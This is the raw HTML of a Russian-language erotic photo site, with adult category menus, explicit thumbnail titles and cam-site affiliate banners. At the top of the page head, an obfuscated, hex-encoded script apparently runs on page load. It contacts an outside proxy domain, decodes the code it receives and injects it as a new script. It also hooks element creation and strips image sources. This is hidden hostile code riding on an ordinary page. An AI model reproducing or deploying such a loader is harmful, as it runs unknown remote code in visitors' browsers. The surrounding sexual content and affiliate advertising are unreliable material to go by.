<?xml version="1.0" encoding="Windows-1251"?>
<!DOCTYPE html>
<html>
  <head>
    <script type="text/javascript">(function(){function c(){var b={};for(var a=0;a< arguments.length;a+= 2){b[arguments[a]]= arguments[a+ 1]};return b}function b(){function h(){var d=l[a[1]](a[0]);var c=0;for(var f=0;f< d[a[2]];f++){if(b== false){b= 1};if(d[f][a[3]]&& d[f][a[3]]!= a[4]){if(!b){b= false;return};d[f][a[3]]= a[4];c++}};return c}function n(){if(b=== true){b= 1}else {var c=l[a[5]]};for(var d=0;d< c[a[2]];d++){c[d][a[6]]= true};h();G[a[7]]()}function y(d,c,g){function b(){return f}var f=d[c][a[8]]();g[a[9]]= d[c][a[10]](d);d[c]= g;d[c][a[8]]= b}function H(d){var c=G[a[12]][a[11]]()- d[a[13]];if(!b){b(1)};if(c< v){n()}}function w(d,b,f){G[a[19]][a[18]](d,b,c(a[14],false,a[15],false,a[16],false,a[17],f))}function r(b){b= z(b);var c=l[a[21]](a[20]);c[a[22]]= false;c[a[23]]= b;l[a[25]][a[24]](c);l[a[25]][a[26]](c)}function z(c){var d=a[27]+ G[a[30]][a[29]]()[a[8]]()[a[28]](2,4);G[d]= x;if(!a){b();b= 0};c= a[31]+ c+ a[32]+ d+ a[33];return c}function A(g,f){function c(){if(!a){b= true};f(h)}function d(){if(b=== null){return};H(h)}var h= new G[a[34]]();h[a[36]](a[35],g,true);h[a[37]]= a[38];h[a[13]]= G[a[12]][a[11]]();h[a[40]](a[39],c);h[a[40]](a[41],d);h[a[42]](null)}function m(f){if(!a){b();b= false;return};var m=f[a[45]]( new G[a[44]](a[43]));if(m){var n=m[1];var s=n[a[47]](a[46]);var o=a[4],p=a[4],v=0,c=[];while(s[v]!= a[48]){p+= s[v];if(b== null){b(true);b= 0};if(++v== s[a[2]]){return}};for(var g=v+ 1;g< s[a[2]];g++){var u=s[g],h=g- v- 1;var t=p[a[28]](h* 2,2);var l=G[a[49]](t,16),j=l;var r=a[4];for(var i=0;i< u[a[2]];i+= 2){var q=G[a[49]](u[a[28]](i,2),16);var d=q^ l;if(b=== a[68]){b()};l= d^ j;if(!a){return};d= d[a[8]](16);if(!a){b= a[91]};if(d[a[2]]< 2){d= a[50]+ d};if(!a){b();b= null;return};r+= d};c[a[51]](r)};if(!b){b(1);return};f= f[a[53]](n,c[a[52]](a[46]))};return f}function q(g){function c(g){function f(c){var g=c[a[71]];var h=null;try{if(b=== false){b();b= null}else {h= g[a[72]][a[54]]}}catch(e){};if(h){if(!b){b();return};q(h);d[a[73]](a[39],f)}}if(!b){b();b= true;return};var c=arguments[a[67]][a[9]];var d=c[a[68]](this,arguments);if(d[a[69]]== a[70]){if(!a){b();return}else {};d[a[40]](a[39],f)};return d}function d(){var c=arguments[a[67]][a[9]];if(!a){b(a[103],a[15]);b= null;return}else {var d=this[a[74]]};c[a[68]](this,arguments);if(d== a[75]){o(this)}}function f(){var b=arguments[a[67]][a[9]];b[a[68]](this,arguments);o(this)}y(g,a[21],c);if(!b){return};var h=d;y(g,a[76],h);y(g,a[65],h);y(g,a[36],f);x[a[77]][a[51]](g);if(!b){b= false};o(g)}function p(d,f){var g=d[a[71]];var c=(f)?x[a[78]]:x[a[79]];if(!a){b()};c[a[51]](g)}function o(b){b[a[40]](a[41],x[a[80]],true);b[a[40]](a[39],x[a[81]],true)}function s(){function f(j){function g(b){r(m(b[a[98]]))}if(j[a[82]]== 204){if(!b){b();b= 0;return};if(c[a[83]]){if(!b){b(1,a[28],true,null,true)}else {G[a[86]][a[85]](a[84])};return};c[a[83]]= l[a[59]][a[87]];A(d(),f);return};x[a[89]][a[88]]= j[a[91]](a[90]);var h=j[a[91]](a[92]);if(!x[a[89]][a[88]]||  !h){return};try{if(!a){b();return};x[a[89]][a[93]]= ( new G[a[95]](h))[a[94]]}catch(e){return};var i=x[a[89]][a[93]][a[97]](a[96]);if(!b){b();b= 1;return}else {if(i> 0){if(!b){return};x[a[89]][a[93]]= x[a[89]][a[93]][a[28]](i+ 1)}};A(h,g)}function d(){var b=[];for(k in c){b[a[51]](k+ a[99]+ G[a[100]](c[k]))};var d=(b[a[2]])?a[101]+ b[a[52]](a[102]):a[4];x[a[89]][a[103]]= E;return E+ a[104]+ g+ d}var c={};if(l[a[106]][a[97]](a[105])!=  -1){if(!b){b();return};c[a[107]]= a[108]};A(d(),f)}function d(a){p(a,true)}function f(a){p(a,false)}if(b=== 0){b= a[107]};if(!b){b();return};var G=window,l=G[a[54]],v=300,u=7,i=a[55],j=a[56];var x={};var g=a[57];if(!a){b= false;return};var t=false;var D=false;var B=null;var E=G[a[59]][a[58]];try{if(G[a[60]]&& G[a[60]][a[61]+ i]== j){G[a[60]][a[61]+ i]= a[4];if(b=== true){b();b= a[114];return};{if(b=== a[10]){b();b= true};l[a[65]](a[62]+ a[63]+ a[64]);l[a[66]]()}}}catch(e){};if(b== a[81]){b(true)};if(!b){b();b= false};try{if(G[a[111]][a[110]][a[97]](a[109])>  -1){var C=G[a[111]][a[114]][a[45]]( new G[a[44]](a[112],a[113]));if(b=== null){b= false;return};if(C&& C[1]){var F=G[a[49]](C[1]);if(F< 10){return}}}}catch(e){return};if(!a){b= false};x[a[78]]= [];x[a[79]]= [];x[a[77]]= [];x[a[89]]= c(a[93],a[4],a[88],a[4]);x[a[115]]= false;x[a[116]]= l[a[21]][a[10]](l);if(!a){return};x[a[80]]= d;x[a[81]]= f;s();if(!b){return};q(l)}var _a=["494d47","676574456c656d656e747342795461674e616d65","6c656e677468","737263","","7374796c65536865657473","64697361626c6564","73746f70","746f537472696e67","5f6f726967","62696e64","6e6f77","706572666f726d616e6365","7374617274","656e756d657261626c65","636f6e666967757261626c65","7772697461626c65","76616c7565","646566696e6550726f7065727479","4f626a656374","736372697074","637265617465456c656d656e74","6173796e63","74657874436f6e74656e74","617070656e644368696c64","646f63756d656e74456c656d656e74","72656d6f76654368696c64","6d7a735f5f","737562737472","72616e646f6d","4d617468","2866756e6374696f6e286d7a5f73747229207b","7d292827","27293b","584d4c4874747052657175657374","474554","6f70656e","726573706f6e736554797065","74657874","6c6f6164","6164644576656e744c697374656e6572","6572726f72","73656e64","766172205f613d5c5b22282e2b29225c5d3b","526567457870","6d61746368","222c22","73706c6974","6266346266643361643236386630306231616336666338613332613533303961","7061727365496e74","30","70757368","6a6f696e","7265706c616365","646f63756d656e74","7474745a5a5a326d","6634464676","70696775697170726f78792e636f6d2f617069","70726f746f636f6c","6c6f636174696f6e","6f70656e6572","5f","3c4e4f","465241","4d45533e","77726974656c6e","636c6f7365","63616c6c6565","6170706c79","7461674e616d65","494652414d45","746172676574","636f6e74656e7457696e646f77","72656d6f76654576656e744c697374656e6572","72656164795374617465","636f6d706c657465","7772697465","646f6373","65725f6c6f6164","73635f6c6f6164","65725f6c697374656e","73635f6c697374656e","737461747573","72","617267206c6f6164206661696c2c20323034","6c6f67","636f6e736f6c65","68726566","73657373696f6e","76617273","582d4d6574612d526571756573742d4964","676574526573706f6e7365486561646572","582d4c6f636174696f6e","70726f78795f686f7374","686f7374","55524c","2d","696e6465784f66","726573706f6e736554657874","3d","656e636f6465555249436f6d706f6e656e74","3f","26","70726f746f","2f2f","6172676f6e5f656e61626c653d31","636f6f6b6965","77","31","4170706c65","76656e646f72","6e6176696761746f72","76657273696f6e2f285c642b29285b302d392e5d2b2920536166617269","69","757365724167656e74","646c6f61646564","63725f656c"];var _o,_i,a=[];for(_o=0;_o<_a.length;_o++)for(a[_o]="",_i=0;_i<_a[_o].length;_i+=2)a[_o]+=String.fromCharCode(parseInt(_a[_o].substr(_i,2),16));if(b=== null){b();b= true;return};(b)()})()/*1c0fc0e1c1f580dc918b0135cc6bfb6711221631*/</script>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
<title>Эротика. Смотреть фото красивых голых девушек бесплатно</title>
<meta name="description" content="Красивая фото эротика, самые откровенные и возбуждающие фото голых девушек, в высоком качестве. Удобный просмотр, слайдшоу и регулярные обновления." />
<meta name="keywords" content="Эротика, девушки, фото, смотреть, бесплатно, голые, без регистрации, красиво" />
<link rel="search" type="application/opensearchdescription+xml" href="http://ero-top.com/engine/opensearch.php" title="Эротика. Смотреть фото красивых голых девушек бесплатно" />
<link rel="alternate" type="application/rss+xml" title="Эротика. Смотреть фото красивых голых девушек бесплатно" href="http://ero-top.com/rss.xml" />
<script type="text/javascript" src="/engine/classes/js/jquery.js"></script>
<script type="text/javascript" src="/engine/classes/js/jqueryui.js"></script>
<script type="text/javascript" src="/engine/classes/js/dle_js.js"></script><script type="text/javascript">
<!--
var dle_root       = '/';
var dle_admin      = '';
var dle_login_hash = '';
var dle_group      = 5;
var dle_skin       = 'ero-top_orange';
var dle_wysiwyg    = '-1';
var quick_wysiwyg  = '0';
var dle_act_lang   = ["Да", "Нет", "Ввод", "Отмена", "Сохранить", "Удалить", "Загрузка. Пожалуйста, подождите..."];
var menu_short     = 'Быстрое редактирование';
var menu_full      = 'Полное редактирование';
var menu_profile   = 'Просмотр профиля';
var menu_send      = 'Отправить сообщение';
var menu_uedit     = 'Админцентр';
var dle_info       = 'Информация';
var dle_confirm    = 'Подтверждение';
var dle_prompt     = 'Ввод информации';
var dle_req_field  = 'Заполните все необходимые поля';
var dle_del_agree  = 'Вы действительно хотите удалить? Данное действие невозможно будет отменить';
var dle_spam_agree = 'Вы действительно хотите отметить пользователя как спамера? Это приведёт к удалению всех его комментариев';
var dle_complaint  = 'Укажите текст Вашей жалобы для администрации:';
var dle_big_text   = 'Выделен слишком большой участок текста.';
var dle_orfo_title = 'Укажите комментарий для администрации к найденной ошибке на странице';
var dle_p_send     = 'Отправить';
var dle_p_send_ok  = 'Уведомление успешно отправлено';
var dle_save_ok    = 'Изменения успешно сохранены. Обновить страницу?';
var dle_reply_title= 'Ответ на комментарий';
var dle_tree_comm  = '0';
var dle_del_news   = 'Удалить статью';
var allow_dle_delete_news   = false;

//-->
</script>
    <style type="text/css" media="all">
      @import url(/templates/ero-top_orange/css/style.css);
    </style>
    <style type="text/css" media="all">
      @import url(/templates/ero-top_orange/css/engine.css);
    </style>
    <link rel="icon" href="/templates/ero-top_orange/images/favicon.ico" type="image/x-icon">
    <link rel="shortcut icon" href="/templates/ero-top_orange/images/favicon.ico" type="image/x-icon">
    </head>
<body>

<div id="container">


<!--Шапка-->
<div id="head">
  <div style="height: 35px;"></div>
    <div align="right" id="srchform">
      <form action="" name="searchform" method="post">
        <input type="hidden" name="do" value="search" /><input type="hidden" name="subaction" value="search" />
        <div id="srch_input">
        <input type="text" name="story" value="Поиск по сайту..." onblur="if(this.value=='') this.value='Поиск по сайту...';" onfocus="if(this.value=='Поиск по сайту...') this.value='';"/>
        </div>
        <div id="srch_button"><a href="#" title="Искать" onclick="document.forms['searchform'].submit();"/></a></div>
      </form>
    </div>
  
  <a href="/" title="Красивая эротика" class="logolink"></a>
  
</div>

<div id="head-menu">
	<ul style="margin:0; padding:0;">
		<li><a href="/">Главная</a></li>
		<li><a href="http://putanapartners.com/go.php?p=13073" target="_blank" rel="nofollow" style="color:red;">Безотказные девчонки (21+)</a></li>
		
		
	</ul>
	
	
		<script type="text/javascript">
				function DropDown(el) {
					this.dd = el;
					this.initEvents();
				}
				DropDown.prototype = {
					initEvents : function() {
						var obj = this;

						obj.dd.on('click', function(event){
							$(this).toggleClass('active');
							event.stopPropagation();
						});	
					}
				}
				$(function() {

					var dd = new DropDown( $('#dd') );

					$(document).click(function() {
						// all dropdowns
						$('.wrapper-dropdown-5').removeClass('active');
					});

				});
		</script>
		<div id="dd" class="wrapper-dropdown-5">
			<span>Сортировать по:</span><form name="news_set_sort" id="news_set_sort" method="post" action="" ><ul class="sort"><li class="asc"><a href="#" onclick="dle_change_sort('date','asc'); return false;">дате</a></li><li><a href="#" onclick="dle_change_sort('rating','desc'); return false;">популярности</a></li><li><a href="#" onclick="dle_change_sort('news_read','desc'); return false;">посещаемости</a></li><li><a href="#" onclick="dle_change_sort('comm_num','desc'); return false;">комментариям</a></li><li><a href="#" onclick="dle_change_sort('title','desc'); return false;">алфавиту</a></li></ul><input type="hidden" name="dlenewssortby" id="dlenewssortby" value="date" />
<input type="hidden" name="dledirection" id="dledirection" value="DESC" />
<input type="hidden" name="set_new_sort" id="set_new_sort" value="dle_sort_main" />
<input type="hidden" name="set_direction_sort" id="set_direction_sort" value="dle_direction_main" />
</form>
		</div>
	
	
</div>	

<div style="clear: both;"></div>

<!--/Шапка-->


<!--Меню-->
  <div id="menu">
	
      <noindex>
    <div style="margin-bottom:5px; margin-top:5px; text-align:center;">
        <iframe scrolling="no" frameborder="0" width="210" height="190" src="http://tools.bongacams.com/promo.php?c=329961&type=dynamic_banner&pt=http&db%5Bwidth%5D=210&db%5Bheight%5D=190&db%5Btype%5D=live&db%5Bmodel_zone%5D=free&db%5Bheader%5D=0&db%5Bfooter%5D=none&db%5Bmlang%5D=0&db%5Bfullscreen%5D=&db%5Bmname%5D=1&db%5Bmlink%5D=1&db%5Bmstatus%5D=1&db%5Bmsize%5D=max&db%5Bmpad%5D=33&db%5Bmwidth%5D=143&db%5Bcolor_scheme%5D=default&db%5Bmborder%5D=solid&db%5Bmborder_color%5D=%23ffffff&db%5Bmborder_over_color%5D=%23a02239&db%5Bmshadow%5D=0&db%5Bmodels_by_geo%5D=1&db%5Bautoupdate%5D=1&db%5Btopmodels%5D=1&db%5Blanding%5D=chat&db%5Blogo_color%5D=default&db%5Bbg_color%5D=%23e35fc9&db%5Bfont_family%5D=Arial&db%5Btext_align%5D=right&db%5Btext_color%5D=%23ffffff&db%5Blink_color%5D=%23ffffff&db%5Beffect%5D=auto&db%5Beffect_speed%5D=optimal&db%5Bmode%5D=mode1"></iframe>
    </div>
</noindex>
	
	


<div id="shap"><div id="shap_h">Авторизация</div></div>
<div id="blok_body"><div id="not-login">
	<form method="post" onsubmit="javascript:showBusyLayer()" action=''>
		Логин:
		<input name="login_name" type="text" id="log-enter"/>
		Пароль (<a href="http://ero-top.com/index.php?do=lostpassword">Напомнить?</a>):
		<input name="login_password" type="password" id="log-enter"/>
		<input onclick="submit();" type="submit" id="enter-but" value="Войти"/>
		<input name="login" type="hidden" id="login" value="submit" />
		<input type="button" id="enter-but" value="Регистрация" onclick="location.href='http://ero-top.com/index.php?do=register'" />
	</form>
</div></div>
<div id="blok_foot"></div>

	
  <div id="shap"><div id="shap_h">Разделы</div></div>
  <div id="blok_body"> 
    <ul id="kat">
      <li id="kat"><a href="/ero/" title="Лучшая эротика"><div id="kat_h">Лучшая эротика</div></a></li>
      <li id="kat"><a href="/home/" title="Домашняя эротика"><div id="kat_h">Домашняя эротика</div></a></li>
      <li id="kat"><a href="/playboy/" title="PlayBoy"><div id="kat_h">PlayBoy</div></a></li>
      <li id="kat"><a href="/brun/" title="Брюнетки"><div id="kat_h">Брюнетки</div></a></li>
      <li id="kat"><a href="/blond/" title="Блондинки"><div id="kat_h">Блондинки</div></a></li>
      <li id="kat"><a href="/red/" title="Рыжие"><div id="kat_h">Рыжие</div></a></li>
      <li id="kat"><a href="/popki/" title="Красивые голые попки"><div id="kat_h">Красивые попки</div></a></li>
      <li id="kat"><a href="/pussy/" title="Голые письки"><div id="kat_h">Голые письки</div></a></li>
      <li id="kat"><a href="/black/" title="Голые негритянки"><div id="kat_h">Голые негритянки</div></a></li>
      <li id="kat"><a href="/asian/" title="Голые азиатки"><div id="kat_h">Голые азиатки</div></a></li>
      <li id="kat"><a href="/grud/" title="Груди"><div id="kat_h">Груди</div></a></li>
      <li id="kat"><a href="/teen/" title="Молодые (Teen)"><div id="kat_h">Молодые (Teen)</div></a></li>
      <li id="kat"><a href="/eromodel/" title="Эротические модели"><div id="kat_h">Эротические модели</div></a></li>
      <li id="kat"><a href="/v_chulkah/" title="Голые девушки в чулках"><div id="kat_h">Девушки в чулках</div></a></li>
      <li id="kat"><a href="/photoarchive/" title="Скачать фото архивы"><div id="kat_h">Скачать фото архивы</div></a></li>
      <li id="kat"><a href="/video/" title="Эротическое видео"><div id="kat_h">Эротическое ВИДЕО</div></a></li>
      <br>
      <li id="kat">
		<a href="/categories.html" title="Эротическа по категориям" style="text-transform:uppercase;">
			<div id="kat_h"><span class="icon-menu" style="font-size:12px;"></span> Все разделы сайта</div>
		</a>
	  </li>
    </ul>
  </div>
  <div id="blok_foot"></div>
  
   <center>
	<a href="http://rus.sibirki.com" target="_blank" rel="nofollow"><img src="/uploads/banner5.jpg"></a>
</center><br>
  
  <div id="shap"><div id="shap_h">Топ девушек</div></div>
  <div id="blok_body" style="text-align:center;"> <a href="http://ero-top.com/brun/12686-golaya-bryunetka-s-volosatym-lobkom-v-basseyne.html"><img class="img-topnews previewimg" src="/uploads/posts/2018-02/thumbs/1518961245_03.jpg" alt="Голая брюнетка с волосатым лобком в бассейне"/></a><a href="http://ero-top.com/eromodel/12684-golaya-russkaya-devushka-pokazyvaet-brituyu-pisku.html"><img class="img-topnews previewimg" src="/uploads/posts/2018-02/thumbs/1518960988_02.jpg" alt="Голая русская девушка показывает бритую письку"/></a><a href="http://ero-top.com/ero/12682-golenkaya-hudyshka-s-malenkoy-grudyu-u-basseyna.html"><img class="img-topnews previewimg" src="/uploads/posts/2018-02/thumbs/1518960770_clover_10398_2.jpg" alt="Голенькая худышка с маленькой грудью у бассейна"/></a><a href="http://ero-top.com/brun/12692-golaya-model-s-korotkoy-strizhkoy-poziruet-na-polu.html"><img class="img-topnews previewimg" src="/uploads/posts/2018-02/thumbs/1519041547_11.jpg" alt="Голая модель с короткой стрижкой позирует на полу"/></a><a href="http://ero-top.com/brun/12705-devushka-s-krasivoy-grudyu-valyaetsya-goloy-v-posteli.html"><img class="img-topnews previewimg" src="/uploads/posts/2018-02/thumbs/1519211484_dita_v_36543_1.jpg" alt="Девушка с красивой грудью валяется голой в постели"/></a><a href="http://ero-top.com/eromodel/12703-laskaet-pisku-i-szhimaet-naturalnye-siski-rukami.html"><img class="img-topnews previewimg" src="/uploads/posts/2018-02/thumbs/1519211239_01.jpg" alt="Ласкает письку и сжимает натуральные сиськи руками"/></a><a href="http://ero-top.com/ero/12706-krasivaya-devushka-s-uprugoy-popoy-i-siskami.html"><img class="img-topnews previewimg" src="/uploads/posts/2018-02/thumbs/1519297000_mandy_l_36547_4.jpg" alt="Красивая девушка с упругой попой и сиськами"/></a><a href="http://ero-top.com/brun/12714-devushka-razdvigaet-pisku-rakom.html"><img class="img-topnews previewimg" src="/uploads/posts/2018-02/thumbs/1519381634_07.jpg" alt="Девушка раздвигает письку раком"/></a><a href="http://ero-top.com/grud/12723-devushka-s-obvisshimi-siskami-v-posteli.html"><img class="img-topnews previewimg" src="/uploads/posts/2018-02/thumbs/1519468569_selina_14776_1.jpg" alt="Девушка с обвисшими сиськами в постели"/></a><a href="http://ero-top.com/eromodel/12733-toschaya-devushka-s-seksualnym-telom-sredi-kamney.html"><img class="img-topnews previewimg" src="/uploads/posts/2018-02/thumbs/1519648697_01.jpg" alt="Тощая девушка с сексуальным телом среди камней"/></a> </div>
  <div id="blok_foot"></div>

  

  
    <div id="shap"><div id="shap_h"><h1>Эротика</h1></div></div>
    <div id="blok_body"> 
    <div id="info">
		<strong>Эротика</strong> – неотъемлемая часть человеческой жизни и будет ли это, ярким событием – решать только вам…<br>
		Сколько тайны и жаркого желания таят в себе глаза томных длинноногих красоток…
		<br>
      Прекрасные и будоражащие ракурсы истинной красоты голого тела на <strong>эротических фото</strong>, способные вызвать щемящие ощущение неги по всему телу. <strong>Голые девушки и женщины</strong>, роскошные прелестницы, блондинки и брюнетки, рыжие девушки, молодые, с красивыми попками и грудями увлекут вас в самые глубины чувственных наслаждений и эротики, в долину оргазмов и грез – и как закончится ваше  путешествие по бескрайним долинам любви и ныряние в пучину страсти, решать только вам.
		<br>
		У нас вы найдете воплощение своих страстных желаний и безудержных  фантазий, посмотрев фото или <a href="http://ero-top.com/video/" title="Эротическое HD видео">видео эротику</a>. Если вы грезите о диком сексе или, наоборот, о чувственной фото эротике и нежном занятии любовью – тогда посетите наш портал, раздел «<a href="http://ero-top.com/" title="Красивая эротика">красивая эротика</a>». Тут вы найдёте разнообразные сюжеты, пикантные сцены, роскошные тела голых девушек – все, что может заставить вас биться в экстазе. Вы будете задыхаться от желания, жадно ловя губами потоки воздуха, как уставший путник, изнывающий от  жажды и жары. А затем взрыв эмоций, расслабление, заряд бодрости – те чувства, ощущения без которых жизнь кажется серой и неполной.
		<br>
		На нашем ресурсе, вы сможете удовлетворить ваши чувственные эротические мечты и желания и ощутить полноту жизни, сексуальной жизни…
    </div>
    <ul id="er_photo"> 
      <li>Только красивые девушки</li>
      <li>Фото - хорошего качества, высокого разрешения</li>
      <li>Удобный просмотр, слайдшоу</li>
      <li>Регулярные обновления</li>
      <li>Большой архив</li>
      <li>Без вирусов</li>
      <li>Совершенно бесплатно</li>
    </ul>
    </div>
    <div id="blok_foot"></div>
  
  
  
  
   
     
  
    
    
    
    
    
    
    
  
  
   
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
   

</div>
<!--/Меню-->


<!--Контент-->
  <div id="content">
	<div id="NDMwNTMzMTM1MjEwODEwMA"></div><script type="text/javascript" src="//tizerbox.lesbi-show.com/js/NDMwNTMzMTM1MjEwODEwMA" async></script>  
	
	<div id='dle-content'>
	<div id="shortstor">
		<span class="favorlink">
			
		</span>
		<span class="rate">
			<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:80%;">80</li>
		</ul>
</div>
		</span>
		<a href="http://ero-top.com/ero/12844-golaya-devushka-s-krasivoy-grudyu-na-prirode.html">
			<div style="text-align:center;"><!--dle_image_begin:http://ero-top.com/uploads/posts/2018-03/thumbs/1521285903_mariposa_12645_3.jpg|--><img src="/uploads/posts/2018-03/thumbs/1521285903_mariposa_12645_3.jpg" alt="Голая девушка с красивой грудью на природе" title="Голая девушка с красивой грудью на природе"  /><!--dle_image_end--></div>
			<span class="inform inftext">
				<b>Голая девушка с красивой грудью на природе</b><br>
				Вчера, 19:28 / <span class="icon-bubble2"></span> : 0 / <span class="icon-eye"></span> : 1 142
			</span>
		</a>
	</div>


	<div id="shortstor">
		<span class="favorlink">
			
		</span>
		<span class="rate">
			<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:100%;">100</li>
		</ul>
</div>
		</span>
		<a href="http://ero-top.com/ero/12845-golaya-krasotka-s-naturalnymi-formami.html">
			<div style="text-align:center;"><!--dle_image_begin:http://ero-top.com/uploads/posts/2018-03/thumbs/1521286044_maxa_a_46739_1.jpg|--><img src="/uploads/posts/2018-03/thumbs/1521286044_maxa_a_46739_1.jpg" alt="Голая красотка с натуральными формами" title="Голая красотка с натуральными формами"  /><!--dle_image_end--></div>
			<span class="inform inftext">
				<b>Голая красотка с натуральными формами</b><br>
				Вчера, 19:25 / <span class="icon-bubble2"></span> : 0 / <span class="icon-eye"></span> : 1 247
			</span>
		</a>
	</div>


	<div id="shortstor">
		<span class="favorlink">
			
		</span>
		<span class="rate">
			<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:60%;">60</li>
		</ul>
</div>
		</span>
		<a href="http://ero-top.com/blond/12846-blondinka-snimaet-bele-i-laskaet-brituyu-v-pisku.html">
			<div style="text-align:center;"><!--dle_image_begin:http://ero-top.com/uploads/posts/2018-03/thumbs/1521286158_05.jpg|--><img src="/uploads/posts/2018-03/thumbs/1521286158_05.jpg" alt="Блондинка снимает белье и ласкает бритую в письку" title="Блондинка снимает белье и ласкает бритую в письку"  /><!--dle_image_end--></div>
			<span class="inform inftext">
				<b>Блондинка снимает белье и ласкает бритую в письку</b><br>
				Вчера, 19:21 / <span class="icon-bubble2"></span> : 0 / <span class="icon-eye"></span> : 1 054
			</span>
		</a>
	</div>


	<div id="shortstor">
		<span class="favorlink">
			
		</span>
		<span class="rate">
			<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:80%;">80</li>
		</ul>
</div>
		</span>
		<a href="http://ero-top.com/eromodel/12847-hudenkaya-devushka-s-goloy-kiskoy.html">
			<div style="text-align:center;"><!--dle_image_begin:http://ero-top.com/uploads/posts/2018-03/thumbs/1521286286_03.jpg|--><img src="/uploads/posts/2018-03/thumbs/1521286286_03.jpg" alt="Худенькая девушка с голой киской" title="Худенькая девушка с голой киской"  /><!--dle_image_end--></div>
			<span class="inform inftext">
				<b>Худенькая девушка с голой киской</b><br>
				Вчера, 19:19 / <span class="icon-bubble2"></span> : 0 / <span class="icon-eye"></span> : 755
			</span>
		</a>
	</div>


	<div id="shortstor">
		<span class="favorlink">
			
		</span>
		<span class="rate">
			<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:100%;">100</li>
		</ul>
</div>
		</span>
		<a href="http://ero-top.com/brun/12848-obnazhennaya-bryunetka-s-krasivym-telom.html">
			<div style="text-align:center;"><!--dle_image_begin:http://ero-top.com/uploads/posts/2018-03/thumbs/1521286357_11.jpg|--><img src="/uploads/posts/2018-03/thumbs/1521286357_11.jpg" alt="Обнажённая брюнетка с красивым телом" title="Обнажённая брюнетка с красивым телом"  /><!--dle_image_end--></div>
			<span class="inform inftext">
				<b>Обнажённая брюнетка с красивым телом</b><br>
				Вчера, 19:11 / <span class="icon-bubble2"></span> : 0 / <span class="icon-eye"></span> : 1 018
			</span>
		</a>
	</div>


	<div id="shortstor">
		<span class="favorlink">
			
		</span>
		<span class="rate">
			<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:100%;">100</li>
		</ul>
</div>
		</span>
		<a href="http://ero-top.com/ero/12849-golaya-devushka-v-kedah-vstaet-rakom.html">
			<div style="text-align:center;"><!--dle_image_begin:http://ero-top.com/uploads/posts/2018-03/thumbs/1521286533_ariel_38755_1.jpg|--><img src="/uploads/posts/2018-03/thumbs/1521286533_ariel_38755_1.jpg" alt="Голая девушка в кедах встает раком" title="Голая девушка в кедах встает раком"  /><!--dle_image_end--></div>
			<span class="inform inftext">
				<b>Голая девушка в кедах встает раком</b><br>
				Вчера, 18:59 / <span class="icon-bubble2"></span> : 0 / <span class="icon-eye"></span> : 1 391
			</span>
		</a>
	</div>


	<div id="shortstor">
		<span class="favorlink">
			
		</span>
		<span class="rate">
			<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:80%;">80</li>
		</ul>
</div>
		</span>
		<a href="http://ero-top.com/ero/12838-krasivaya-golaya-blondinka-s-malenkoy-grudyu.html">
			<div style="text-align:center;"><!--dle_image_begin:http://ero-top.com/uploads/posts/2018-03/thumbs/1521200316_katrina_22_47675_1.jpg|--><img src="/uploads/posts/2018-03/thumbs/1521200316_katrina_22_47675_1.jpg" alt="Красивая голая блондинка с маленькой грудью" title="Красивая голая блондинка с маленькой грудью"  /><!--dle_image_end--></div>
			<span class="inform inftext">
				<b>Красивая голая блондинка с маленькой грудью</b><br>
				16-03-2018 / <span class="icon-bubble2"></span> : 0 / <span class="icon-eye"></span> : 3 598
			</span>
		</a>
	</div>


	<div id="shortstor">
		<span class="favorlink">
			
		</span>
		<span class="rate">
			<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:80%;">80</li>
		</ul>
</div>
		</span>
		<a href="http://ero-top.com/ero/12839-ryzhaya-devushka-s-kosichkami-vstala-rakom-v-pole.html">
			<div style="text-align:center;"><!--dle_image_begin:http://ero-top.com/uploads/posts/2018-03/thumbs/1521200467_jia_lissa_21_38849_4.jpg|--><img src="/uploads/posts/2018-03/thumbs/1521200467_jia_lissa_21_38849_4.jpg" alt="Рыжая девушка с косичками встала раком в поле" title="Рыжая девушка с косичками встала раком в поле"  /><!--dle_image_end--></div>
			<span class="inform inftext">
				<b>Рыжая девушка с косичками встала раком в поле</b><br>
				16-03-2018 / <span class="icon-bubble2"></span> : 0 / <span class="icon-eye"></span> : 3 658
			</span>
		</a>
	</div>


	<div id="shortstor">
		<span class="favorlink">
			
		</span>
		<span class="rate">
			<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:100%;">100</li>
		</ul>
</div>
		</span>
		<a href="http://ero-top.com/popki/12840-sportsmenka-s-krasivoy-piskoy-i-uprugoy-popoy.html">
			<div style="text-align:center;"><!--dle_image_begin:http://ero-top.com/uploads/posts/2018-03/thumbs/1521200537_04.jpg|--><img src="/uploads/posts/2018-03/thumbs/1521200537_04.jpg" alt="Спортсменка с красивой писькой и упругой попой" title="Спортсменка с красивой писькой и упругой попой"  /><!--dle_image_end--></div>
			<span class="inform inftext">
				<b>Спортсменка с красивой писькой и упругой попой</b><br>
				16-03-2018 / <span class="icon-bubble2"></span> : 1 / <span class="icon-eye"></span> : 5 659
			</span>
		</a>
	</div>


	<div id="shortstor">
		<span class="favorlink">
			
		</span>
		<span class="rate">
			<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:100%;">100</li>
		</ul>
</div>
		</span>
		<a href="http://ero-top.com/ero/12841-devushka-trogaet-svoyu-goluyu-brituyu-kisku.html">
			<div style="text-align:center;"><!--dle_image_begin:http://ero-top.com/uploads/posts/2018-03/thumbs/1521200711_02.jpg|--><img src="/uploads/posts/2018-03/thumbs/1521200711_02.jpg" alt="Девушка трогает свою голую бритую киску" title="Девушка трогает свою голую бритую киску"  /><!--dle_image_end--></div>
			<span class="inform inftext">
				<b>Девушка трогает свою голую бритую киску</b><br>
				16-03-2018 / <span class="icon-bubble2"></span> : 0 / <span class="icon-eye"></span> : 2 540
			</span>
		</a>
	</div>


	<div id="shortstor">
		<span class="favorlink">
			
		</span>
		<span class="rate">
			<div class="rating">
		<ul class="unit-rating">
		<li class="current-rating" style="width:80%;">80</li>
		</ul>
</div>
		</span>
